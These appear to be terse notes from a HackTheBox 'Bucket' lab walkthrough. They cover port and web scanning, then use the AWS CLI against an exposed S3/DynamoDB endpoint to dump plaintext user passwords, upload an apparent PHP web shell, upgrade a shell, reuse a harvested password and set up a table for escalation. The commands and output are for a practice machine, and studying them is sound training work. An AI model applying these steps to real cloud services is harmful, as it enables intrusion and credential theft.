PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel


+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 14e0, size: 5c0868a50a1bf, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET

[14:55:12] 200 -   54B  - /health
[14:55:58] 403 -  278B  - /server-status
[14:55:58] 403 -  278B  - /server-status/
[14:56:01] 200 -    0B  - /shell
[14:56:01] 500 -  158B  - /shell.php
[14:56:01] 500 -  158B  - /shell.sh
[14:56:01] 500 -  158B  - /shellz.php
[14:56:01] 200 -   13KB - /shell/


http://s3.bucket.htb/shell/


root@kali:~/workspace/10.10.10.212# aws configure
AWS Access Key ID [None]: dr
AWS Secret Access Key [None]: dv
Default region name [None]: us-east-1     
Default output format [None]: text
root@kali:~/workspace/10.10.10.212# aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/
TABLENAMES	users
root@kali:~/workspace/10.10.10.212# aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
None	3	3
PASSWORD	Management@#1@#
USERNAME	Mgmt

PASSWORD	Welcome123!
USERNAME	Cloudadm

PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm

root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 ls
2021-04-22 15:09:04 adserver
root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
                           PRE images/
2021-04-22 15:09:04       5344 index.html
root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserverimages

An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images

root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 cp w.php s3://adserver/w.php
upload: ./w.php to s3://adserver/w.php                        
root@kali:~/workspace/10.10.10.212# aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/
                           PRE images/
2021-04-22 15:11:04       5344 index.html
2021-04-22 15:12:11       1069 w.php



www-data@bucket:/home/roy/project$ cat db.php
cat db.php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo


python3 -c 'import pty;pty.spawn("/bin/bash")'


roy:n2vM-<_K_Q:.Aa2

* user.txt


aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
TABLEDESCRIPTION	1619064819.797	0	arn:aws:dynamodb:us-east-1:000000000000:table/alerts	alerts	0	ACTIVE
ATTRIBUTEDEFINITIONS	title	S
ATTRIBUTEDEFINITIONS	data	S
KEYSCHEMA	title	HASH
KEYSCHEMA	data	RANGE
PROVISIONEDTHROUGHPUT	0.0	0.0	0	10	5



https://www.security-hive.com/post/hackthebox-bucket-walkthrough